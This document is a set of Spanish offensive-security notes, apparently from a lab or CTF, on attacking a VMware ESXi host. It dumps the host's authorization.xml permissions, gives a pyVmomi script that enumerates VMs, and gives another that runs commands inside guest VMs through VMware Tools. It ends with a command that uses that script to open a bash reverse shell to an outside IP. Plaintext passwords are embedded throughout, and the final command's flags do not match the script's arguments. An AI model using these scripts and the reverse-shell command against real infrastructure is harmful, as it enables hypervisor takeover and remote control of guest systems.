### ESXi — authorization.xml (Resumen)

El archivo `/etc/vmware/hostd/authorization.xml` define las **ACL del host ESXi**, indicando qué usuarios o grupos tienen acceso y con qué rol.

- Cada `<ACEData>` representa una **entrada de permisos (ACE)**.
- `ha-folder-root` = permisos aplicados **sobre todo el host**.
- `ACEDataPropagate: true` → permisos **heredados** a VMs y recursos.
- `ACEDataRoleId: -1` → **rol Administrador** (full access).
- `ACEDataIsGroup` distingue **grupo vs usuario**.
- `Domain Admins` y `virt-admin` tienen permisos administrativos en ESXi.
- `root`, `dcui` y `vpxuser` son cuentas locales/sistema con acceso por defecto.

**Nota ofensiva:** comprometer Domain Admin o `virt-admin` = control total del hipervisor y sus VMs.


```bash
[TELECORE\administrator@ESXi-VD:~] esxcli system permission list
 HTTP Error 404: Not Found
[TELECORE\administrator@ESXi-VD:~] cat /etc/vmware/hostd/authorization.xml
<ConfigRoot>
  <ACEData id="10">
    <ACEDataEntity>ha-folder-root</ACEDataEntity>
    <ACEDataId>10</ACEDataId>
    <ACEDataIsGroup>false</ACEDataIsGroup>
    <ACEDataPropagate>true</ACEDataPropagate>
    <ACEDataRoleId>-1</ACEDataRoleId>
    <ACEDataUser>root</ACEDataUser>
  </ACEData>
  <ACEData id="11">
    <ACEDataEntity>ha-folder-root</ACEDataEntity>
    <ACEDataId>11</ACEDataId>
    <ACEDataIsGroup>false</ACEDataIsGroup>
    <ACEDataPropagate>true</ACEDataPropagate>
    <ACEDataRoleId>-1</ACEDataRoleId>
    <ACEDataUser>dcui</ACEDataUser>
  </ACEData>
  <ACEData id="12">
    <ACEDataEntity>ha-folder-root</ACEDataEntity>
    <ACEDataId>12</ACEDataId>
    <ACEDataIsGroup>false</ACEDataIsGroup>
    <ACEDataPropagate>true</ACEDataPropagate>
    <ACEDataRoleId>-1</ACEDataRoleId>
    <ACEDataUser>vpxuser</ACEDataUser>
  </ACEData>
  <ACEData id="14">
    <ACEDataEntity>ha-folder-root</ACEDataEntity>
    <ACEDataId>14</ACEDataId>
    <ACEDataIsGroup>true</ACEDataIsGroup>
    <ACEDataPropagate>true</ACEDataPropagate>
    <ACEDataRoleId>-1</ACEDataRoleId>
    <ACEDataUser>TELECORE\domain^admins</ACEDataUser>
  </ACEData>
  <ACEData id="15">
    <ACEDataEntity>ha-folder-root</ACEDataEntity>
    <ACEDataId>15</ACEDataId>
    <ACEDataIsGroup>false</ACEDataIsGroup>
    <ACEDataPropagate>true</ACEDataPropagate>
    <ACEDataRoleId>-1</ACEDataRoleId>
    <ACEDataUser>TELECORE\virt-admin</ACEDataUser>
  </ACEData>
  <NextAceId>16</NextAceId>
</ConfigRoot>[TELECORE\administrator@ESXi-VD:~] 

```

1. Guest VM encendida (credenciales disponibles).
2. Guest VM debe tener VMware Tools instalado.
3. La red debe permitir comunicación entre Guest VM y el host (en ambos sentidos).

```python
#!/usr/bin/env python3
# pip3 install pyVmomi
# Enumerar VMs de un ESXi / vCenter usando pyVmomi

import ssl
from pyVim.connect import SmartConnect, Disconnect
from pyVmomi import vim


def main():
    # Desactivar verificación de cert (lab / CTF)
    ctx = ssl._create_unverified_context()

    si = SmartConnect(
        host="10.5.2.111",
        user="administrator@telecore.ad",
        pwd="August1990password",  # TODO: cambiar por la contraseña real o usar input/argparse
        sslContext=ctx,
    )

    try:
        content = si.RetrieveContent()

        container_view = content.viewManager.CreateContainerView(
            content.rootFolder,
            [vim.VirtualMachine],
            True
        )

        for vm in container_view.view:
            # IP por defecto
            ip = "N/A"

            # Intentar sacar la IP de forma “segura”
            try:
                if vm.guest is not None:
                    # IP principal
                    if getattr(vm.guest, "ipAddress", None):
                        ip = vm.guest.ipAddress
                    # Fallback: primera IP del primer adaptador
                    elif (
                        vm.guest.net
                        and vm.guest.net[0].ipConfig
                        and vm.guest.net[0].ipConfig.ipAddress
                    ):
                        ip = vm.guest.net[0].ipConfig.ipAddress[0].ipAddress
            except Exception:
                ip = "N/A"

            print(f"""VM: {vm.name}
  Power: {vm.runtime.powerState}
  OS: {vm.config.guestFullName}
  Tools: {vm.guest.toolsStatus}
  IP: {ip}
  Notes: {vm.config.annotation}

""")

    finally:
        Disconnect(si)


if __name__ == "__main__":
    main()
 
 ```

```python 

#!/usr/bin/env python3
import ssl
import argparse
import sys
import time

from pyVim import connect
from pyVmomi import vim


def get_args():
    parser = argparse.ArgumentParser(
        description="Ejecutar un comando en una Guest VM usando VMware Tools"
    )

    # Conexión al ESXi / vCenter
    parser.add_argument("--host", required=True, help="IP o hostname de ESXi/vCenter")
    parser.add_argument("--user", required=True, help="Usuario de ESXi/vCenter")
    parser.add_argument("--password", required=True, help="Password de ESXi/vCenter")

    # VM objetivo
    parser.add_argument("--vm", required=True, help="Nombre de la VM objetivo")

    # Credenciales dentro de la VM (Guest)
    parser.add_argument("--guest-user", required=True, help="Usuario dentro de la VM")
    parser.add_argument("--guest-pass", required=True, help="Password dentro de la VM")

    # Comando a ejecutar en la VM
    parser.add_argument("--cmd", required=True, help="Ruta del binario en la VM")
    parser.add_argument(
        "--args",
        default="",
        help="Argumentos para el comando dentro de la VM (opcional)",
    )

    return parser.parse_args()


def main():
    a = get_args()

    # Ignorar verificación de certificado (entornos de lab/CTF)
    ctx = ssl._create_unverified_context()

    try:
        si = connect.SmartConnect(
            host=a.host,
            user=a.user,
            pwd=a.password,
            sslContext=ctx,
        )
    except Exception as e:
        print(f"[!] Error conectando a {a.host}: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        content = si.content

        # Buscar la VM por nombre
        container_view = content.viewManager.CreateContainerView(
            content.rootFolder, [vim.VirtualMachine], True
        )
        vms = [v for v in container_view.view if v.name == a.vm]

        if not vms:
            print(f"[!] VM '{a.vm}' no encontrada", file=sys.stderr)
            sys.exit(1)

        vm = vms[0]

        pm = content.guestOperationsManager.processManager

        auth = vim.NamePasswordAuthentication(
            username=a.guest_user,
            password=a.guest_pass,
            interactiveSession=False,
        )

        spec = vim.vm.guest.ProcessManager.ProgramSpec(
            programPath=a.cmd,
            arguments=a.args,
        )

        pid = pm.StartProgramInGuest(vm, auth, spec)
        print(f"[+] Comando lanzado en la VM '{vm.name}', PID: {pid}")

        # Esperar un poco y consultar exitCode
        time.sleep(2)
        proc = pm.ListProcessesInGuest(vm, auth, [pid])[0]
        print(f"[+] exitCode: {proc.exitCode}")

    finally:
        connect.Disconnect(si)


if __name__ == "__main__":
    main()
```

```bash
python3 cmd_exec.py --host 10.5.2.111 --user administrator@telecore.ad --password 'August1990password' --vm 'VaultVM' --guest-user linux --gust-pass 'VaultAdmin@123'  --cmd /bin/bash --arg "-c 'bash -i >& /dev/tcp/10.10.20.72/5556 0>&1'"
```
